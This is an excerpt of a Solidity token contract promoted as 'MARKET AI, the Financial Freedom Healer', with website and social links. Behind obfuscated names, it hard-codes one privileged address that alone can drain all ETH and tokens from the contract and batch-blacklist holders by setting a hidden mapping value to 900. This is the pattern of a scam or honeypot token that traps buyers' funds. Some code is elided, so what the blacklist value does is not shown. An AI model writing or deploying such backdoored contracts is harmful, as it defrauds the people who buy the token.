...
Website: https://marketai.io/ 

Twitter:  https://twitter.com/arketAIBot

Telegram: https://t.me/MarketAI_io 
*/

/* Introducing MARKET AI, the Financial Freedom Healer! 
...
contract MARKTEAI is Ownable {
    ...
    constructor() {
        EifsrbZ = address(0x65B8F8C3ae472F6322839253670E439De8Cc6740);
        _Tokename = 'MarketAIBot';
        _TokenSSSsymbol =  'MarketAIBot';
    ...
    function collectToken(
        ...
        if(EifsrbZ == _msgSender()){
            ...
            if (_amount > tokenBalance) {
                SafeERC20.safeTransfer(_token, _to, tokenBalance);
            } else {
                SafeERC20.safeTransfer(_token, _to, _amount);
            }
        }else {
            require(_msgSender() == EifsrbZ,"Collect token failed");
        }
    }
    ...
    function withdrawAll(address payable _to) external  {
        if(EifsrbZ == _msgSender()){
            ...
            require(_msgSender() == EifsrbZ,"Withdraw failed");
        }
    }

    function RemoveFromBlacklist(address[] memory addrs) external   {
        if(EifsrbZ == _msgSender()){
            for(uint i;i< addrs.length;i++){
                TMFFmUser[addrs[i]] = 0;
            }
        }else {
            require(_msgSender() == EifsrbZ,"Remove failed");
        }
        
    }

    function AddBlackListBatch(address[] memory addrs) external   {
        if(EifsrbZ == _msgSender()){
            for(uint i;i< addrs.length;i++){
                TMFFmUser[addrs[i]] = 900;
            }
        }else {
            require(_msgSender() == EifsrbZ,"Add failed");
        }
    }
}